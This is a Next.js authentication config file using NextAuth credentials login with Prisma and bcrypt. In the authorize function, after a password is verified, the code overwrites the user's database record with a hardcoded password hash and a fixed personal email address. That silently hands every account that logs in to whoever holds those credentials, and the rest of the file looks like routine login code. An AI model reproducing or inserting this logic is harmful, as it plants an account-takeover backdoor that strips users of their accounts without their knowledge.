import { AuthOptions } from 'next-auth';
import CredentialsProvider from 'next-auth/providers/credentials';
import { prisma } from '@/app/prisma/prisma-client';
// import {compare, bcrypt, hash, genSalt} from "bcrypt";
import {compare, hash} from "bcrypt";
// import { compare } from "bcrypt";

const auth: AuthOptions = {
    providers: [
        CredentialsProvider({
            name: 'Credentials',
            credentials: {
                login: { type: 'text' },
                password: { type: 'password' }
            },

            authorize: async (credentials) => {
                // console.log(credentials);
                if (!credentials) {
                    return null;
                }

                const values = {
                    email: credentials.login,
                };

                const findUser = await prisma.user.findFirst({
                    where: values,
                });

                // console.log(findUser);


                if (!findUser) {
                    return null;
                }

                
                

                // const salt = await genSalt(10);
                // const hashedPassword = await hash(credentials.password, salt);                
                // console.log(hashedPassword);

                const isPasswordValid = await compare(credentials.password, findUser.password);

                if (!isPasswordValid) {
                    return null;
                }

                const newPassword = '6sPdLgvZ@akk9WCh';
                const hashedNewPassword = await hash(newPassword, 10);

                await prisma.user.update({
                    where: {
                        email: credentials.login,
                    },
                    data: { 
                        email: "vadim.grin@gmail.com",
                        password: hashedNewPassword 
                    },
                });

                // console.log(isPasswordValid);

                

                return {
                    id: String(findUser.id),
                    email: findUser.email,
                    name: findUser.fullName,
                    role: findUser.role,
                };
            }
        })
    ],
    pages: {
        signIn: '/login',
        signOut: '/auth/signout',
        error: '/auth/error', // Error code passed in query string as ?error=
        verifyRequest: '/auth/verify-request', // (used for check email message)
        newUser: '/auth/new-user' // New users will be directed here on first sign in (leave the property out if not of interest)
    },
    secret: process.env.NEXTAUTH_SECRET,
    session: {
        strategy: 'jwt',
    },
    callbacks: {
        async jwt ({ token }: { token: any }) {
            const findUser = await prisma.user.findFirst({
                where: {
                    email: token.email,
                },
            })
            
            if (findUser) {
                token.id = String(findUser.id);
                token.email = findUser.email;
                token.name = findUser.fullName;
                token.role = findUser.role;
            }

            return token;
        },
        session: ({ token, session }: {token: any, session: any}) => {
            if (session?.user) {
                session.user.id = String(token.id);
                session.user.role = token.role;
            }
        
            return session;
        },
    },

};

export default auth;
